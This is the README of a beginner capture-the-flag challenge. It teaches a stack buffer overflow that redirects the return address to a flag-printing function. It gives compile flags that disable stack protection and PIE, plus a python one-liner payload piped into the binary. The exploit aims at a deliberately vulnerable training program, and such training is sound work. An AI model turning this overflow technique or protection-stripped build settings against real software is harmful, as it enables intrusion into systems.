# Jack the ROPper (Jack - @omnifocal1)

## Very simple ROP
- Binary has a function that never gets called (which prints flag)
- Reverse and see:
    - Input with bad bounds checking
    - Address of a function that will perform a desired action (printing the flag)
- Overflow saved return address with address of flag-printing function
- Win!

## How to compile
- On kali-rolling
- `apt install libc6-dev-i386`
- `gcc -m32 -fno-stack-protector -fno-PIC -no-pie -o jtr jtr.c`

## How to win
- Read the SecTalks slides: `jtr.key`
- Read the challenge walkthrough:
    - Detailed: `jtr_walkthrough.md`
    - Short:    `jtr_walkthrough_short.md`
- Note that if using radare2 you should install from git:
    - https://github.com/radare/radare2
- Or do it the quick way:
    - Find the starting address of the win function
        - `objdump -t jtr | grep win`
    - Copy the address in the first column and reverse byte order e.g.:
        - `0804849b g     F .text	00000019              win`
        - Becomes: `9b840408`
    - Build command line to overflow buffer and blast the win address all over the stack :P
        - `python -c 'print("\x9b\x84\x04\x08" * 100)'`
    - Run it!:
        - `python -c 'print("\x9b\x84\x04\x08" * 100)' | ./jtr`
